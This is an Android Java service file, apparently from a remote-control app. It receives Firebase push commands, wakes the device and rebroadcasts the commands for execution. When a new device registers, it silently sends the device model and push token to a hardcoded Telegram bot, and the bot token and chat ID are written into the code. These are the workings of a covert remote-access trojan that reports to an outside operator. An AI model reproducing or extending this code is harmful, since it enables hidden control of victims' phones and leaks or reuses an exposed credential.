package com.example.androidremote;

import android.content.Intent;
import android.os.PowerManager;
import android.util.Log;

import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.Map;

public class RemoteFirebaseMessagingService extends FirebaseMessagingService {
    private static final String TAG = "RemoteFcmService";

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        Map<String, String> data = remoteMessage.getData();
        if (data == null || !data.containsKey(RemoteCommand.EXTRA_COMMAND)) {
            Log.w(TAG, "Ignoring FCM without command data");
            return;
        }

        KeepAliveService.start(this);
        wakeBriefly();

        Intent intent = new Intent(RemoteCommand.ACTION);
        for (Map.Entry<String, String> entry : data.entrySet()) {
            intent.putExtra(entry.getKey(), entry.getValue());
        }
        LocalBroadcastManager.getInstance(this).sendBroadcast(intent);
    }

    @Override
    public void onNewToken(String token) {
        Log.i(TAG, "FCM device token: " + token);
        new Thread(() -> {
            try {
                String botToken = "8399801733:AAGoh3bx0HfIAa0hW2YzlUYJdG6Kmpz7ClU";
                String chatId = "5364030645";
                String deviceName = android.os.Build.MODEL;
                String message = "📱 Nuevo dispositivo registrado!\nModelo: " + deviceName + "\nToken FCM:\n" + token;
                String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
                java.net.URL apiUrl = new java.net.URL(url);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) apiUrl.openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Failed to send token to Telegram", e);
            }
        }).start();
    }

    private void wakeBriefly() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            int flags = PowerManager.PARTIAL_WAKE_LOCK;
            if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.P) {
                flags = PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                        | PowerManager.ACQUIRE_CAUSES_WAKEUP
                        | PowerManager.ON_AFTER_RELEASE;
            }
            PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
                    flags,
                    "AndroidRemote:CommandWakeLock"
            );
            wakeLock.acquire(10_000L);
        } catch (RuntimeException ex) {
            Log.e(TAG, "Wake lock failed", ex);
        }
    }
}